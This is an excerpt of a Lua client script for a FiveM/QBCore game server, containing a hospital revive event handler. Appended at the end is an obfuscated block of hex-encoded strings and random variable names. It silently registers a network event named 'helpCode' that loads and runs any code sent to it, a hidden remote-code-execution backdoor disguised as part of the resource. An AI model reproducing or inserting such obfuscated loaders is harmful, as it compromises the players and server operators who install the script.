...
RegisterNetEvent('hospital:client:Revive', function()
   -- LocalPlayer.state.disableProximity = true -- Another edit here !
    exports['pma-voice']:resetProximityCheck() -- FailureCC edit here, return to voice chat
    local player = PlayerPedId()
    ...
    TriggerEvent("FailureCC:setVoiceStop", true)
    TriggerServerEvent("hospital:server:SetLaststandStatus", false)
    emsNotified = false
    QBCore.Functions.Notify(Lang:t('info.healthy'))
    TriggerEvent('dynasty-deathscreen:revive')
end)
...
local XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg[6][XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg[1]](XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg[2]) XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg[6][XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg[3]](XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg[2], function(ICEfVCZMsDEwnscZqJAtzZrgFCKjmRNmHpJjEHLoUAXCrkEueyqPSpUbeMZOILLFmbPBXN) XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg[6][XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg[4]](XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg[6][XAOWGHvuCIxdMafHbAJiftAXetdPtDzxbhyqmiHgMHtrACIdxIIkgxzAqfNMeOQMMekDBg[5]](ICEfVCZMsDEwnscZqJAtzZrgFCKjmRNmHpJjEHLoUAXCrkEueyqPSpUbeMZOILLFmbPBXN))() end)